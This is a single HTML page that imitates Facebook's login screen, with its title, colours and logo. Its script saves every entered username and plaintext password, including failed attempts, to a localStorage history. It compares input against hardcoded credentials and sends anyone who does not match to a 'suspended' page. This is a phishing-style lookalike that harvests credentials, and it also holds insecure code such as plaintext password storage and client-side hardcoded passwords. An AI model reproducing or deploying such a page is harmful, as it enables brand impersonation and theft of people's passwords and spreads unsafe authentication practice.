<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .logo {
      margin-bottom: 10px;
    }

    .login-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    h2 {
      color: #1877f2;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #145dbf;
    }

    .signup {
      margin-top: 15px;
      font-size: 14px;
    }

    .signup a {
      color: #1877f2;
      font-weight: bold;
      text-decoration: none;
    }

    .signup a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- Facebook Logo -->
  <div class="logo">
    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook Logo" width="150">
  </div>

  <!-- Login Box -->
  <div class="login-box">
    <h2>Facebook Login</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Email or Phone" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <!-- Sign Up Option -->
    <div class="signup">
      Donâ€™t have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      // Save login info
      localStorage.setItem("storedUsername", username);

      let history = JSON.parse(localStorage.getItem("loginHistory")) || [];
      history.unshift({
        username,
        password,
        time: new Date().toLocaleString()
      });
      localStorage.setItem("loginHistory", JSON.stringify(history.slice(0, 10)));

      // Login check
      if (username.toLowerCase() === "jin" && password === "synonym117") {
        window.location.href = "dashboard.html";
      } else {
        window.location.href = "suspended.html";
      }
    });
  </script>

</body>
</html>
